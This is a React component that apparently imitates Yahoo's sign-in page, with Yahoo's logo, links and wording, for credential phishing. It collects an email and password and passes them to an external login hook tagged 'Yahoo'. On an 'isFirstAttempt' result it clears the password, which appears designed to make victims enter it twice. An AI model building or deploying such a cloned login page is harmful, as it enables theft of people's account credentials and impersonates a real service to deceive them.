import React, { useState } from 'react';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';

interface YahooLoginPageProps {
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
}

const YahooLoginPage: React.FC<YahooLoginPageProps> = ({ onLoginSuccess, onLoginError }) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPasswordStep, setShowPasswordStep] = useState(false);

  const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);

  const handleNext = (e: React.MouseEvent<HTMLButtonElement>) => {
    e.preventDefault();
    if (email) {
      setShowPasswordStep(true);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    const result = await handleFormSubmit(e, { email, password, provider: 'Yahoo' });
    if (result?.isFirstAttempt) {
      setPassword('');
    }
  };

  const YahooLogo = ({ className = '' }: { className?: string }) => (
    <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" className={`select-none ${className}`} />
  );

  return (
    <div className="min-h-screen bg-white font-sans flex flex-col">
      <header className="flex-shrink-0 flex justify-between items-center py-4 px-10">
        <YahooLogo className="h-7" />
        <div className="flex items-center space-x-4 text-xs text-gray-600">
          <a href="https://help.yahoo.com" target="_blank" rel="noopener noreferrer" className="hover:underline">Help</a>
          <a href="https://legal.yahoo.com/us/en/yahoo/terms/otos/index.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Terms</a>
          <a href="https://legal.yahoo.com/us/en/yahoo/privacy/index.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Privacy</a>
        </div>
      </header>

      {/* Main content area with corrected alignment */}
      <main className="flex-grow w-full flex justify-center px-4 pt-24">
        <div className="w-full max-w-7xl flex justify-between items-start">
          
          {/* Left side text block with enough space to prevent wrapping */}
          <div className="hidden md:block pt-12">
            <h1 className="text-3xl font-semibold text-gray-900 mb-4 tracking-tight whitespace-nowrap">
              Yahoo makes it easy to enjoy what matters most in your world.
            </h1>
            <p className="text-lg text-gray-600 leading-relaxed max-w-md">
              Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of life.
            </p>
          </div>

          {/* Right side login form, pushed to the right */}
          <div className="w-full md:w-auto flex-shrink-0">
            <div 
              className="w-full max-w-[360px] mx-auto p-8 bg-white rounded-2xl border border-gray-100"
              style={{ boxShadow: '0 4px 60px rgba(0,0,0,.1)' }}
            >
              {/* Corrected spacing for the logo inside the card */}
              <YahooLogo className="h-9 mx-auto mt-2 mb-6" /> 
              
              <h2 className="text-center text-xl font-semibold text-gray-900">
                {!showPasswordStep ? 'Sign in to Yahoo Mail' : 'Enter password'}
              </h2>
              <p className="text-center text-sm text-gray-500 mt-1">
                using your Yahoo account
              </p>
              
              {showPasswordStep && (
                <div className="text-center my-4 p-2 bg-gray-100 rounded-full text-sm font-semibold truncate">{email}</div>
              )}

              <form onSubmit={handleSubmit} className="mt-6 space-y-4">
                {errorMessage && !isLoading && (
                    <p className="text-red-600 text-sm font-medium text-center">{errorMessage}</p>
                )}

                {!showPasswordStep ? (
                  <div>
                    <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="Username, email, or mobile" required className="w-full px-1 py-3 border-b border-gray-300 focus:outline-none focus:border-purple-600 transition-colors" />
                    <button onClick={handleNext} disabled={!email} className="w-full mt-4 py-3 bg-[#6300be] text-white font-bold rounded-full hover:bg-[#5a00ac] disabled:bg-purple-300 transition-colors">
                      Next
                    </button>
                  </div>
                ) : (
                  <div>
                    <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Password" required autoFocus className="w-full px-1 py-3 border-b border-gray-300 focus:outline-none focus:border-purple-600 transition-colors" />
                     <button type="submit" disabled={isLoading || !password} className="w-full mt-4 py-3 bg-[#6300be] text-white font-bold rounded-full hover:bg-[#5a00ac] disabled:opacity-50 transition-colors">
                      {isLoading ? <Spinner size="sm" color="border-white" className="mx-auto" /> : 'Sign In'}
                    </button>
                  </div>
                )}
              </form>

              <div className="text-xs mt-4 flex justify-between items-center">
                  <label className="flex items-center space-x-2 text-gray-600 cursor-pointer">
                      <input type="checkbox" className="form-checkbox h-4 w-4 text-purple-600 border-gray-300 rounded focus:ring-purple-500" defaultChecked />
                      <span>Stay signed in</span>
                  </label>
                  <a href="https://login.yahoo.com/forgot" target="_blank" rel="noopener noreferrer" className="text-sm text-purple-600 hover:underline font-medium">Forgot username?</a>
              </div>
              
              <div className="mt-6 space-y-4">
                  <a href="https://login.yahoo.com/account/create" target="_blank" rel="noopener noreferrer" className="w-full block text-center py-3 border border-purple-500 text-purple-600 font-bold rounded-full hover:bg-purple-50 transition-colors">
                      Create an account
                  </a>
                  <div className="relative text-center my-2">
                      <span className="absolute inset-x-0 top-1/2 h-px bg-gray-200"></span>
                      <span className="relative bg-white px-2 text-xs text-gray-500">or</span>
                  </div>
                  <a href="https://login.yahoo.com/" target="_blank" rel="noopener noreferrer" className="w-full flex justify-center items-center gap-2 py-3 border border-gray-300 text-gray-800 font-bold rounded-full hover:bg-gray-50 transition-colors">
                      <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google" className="w-5 h-5"/>
                      Sign in with Google
                  </a>
              </div>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default YahooLoginPage;
